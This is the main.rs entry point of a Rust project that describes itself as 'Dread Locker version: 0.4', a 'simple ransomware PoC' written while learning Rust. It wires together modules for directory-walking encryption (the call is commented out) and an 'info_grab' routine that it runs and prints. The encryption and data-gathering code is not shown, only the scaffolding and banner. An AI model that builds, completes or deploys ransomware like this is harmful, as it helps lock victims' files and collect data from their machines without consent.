use std::env;
use std::process;
mod settings;
mod encryption_functions;
mod tests;
mod info_grab;
use crate::settings::Config;
use crate::encryption_functions::iterate_dir;
fn main() {
   /*  let args: Vec<String> = env::args().collect();
    let mut config: Config = Config::new(args).unwrap_or_else(|err| {
        eprintln!("Syntax error: {}", err);
        process::exit(1);
        
    });
    style();
    iterate_dir(&mut config); */
    println!("Trying to get info");
    let result = info_grab::get_info();
    println!("Result: {:?}", result);
}
fn style() {
    println!("---------------------------------------");
    println!(r"\______Dread Locker version: 0.4______/");
    println!("---------------------------------------");
    println!("Simple ransomware PoC because I'm currently learning Rust and I figured why not!");
}

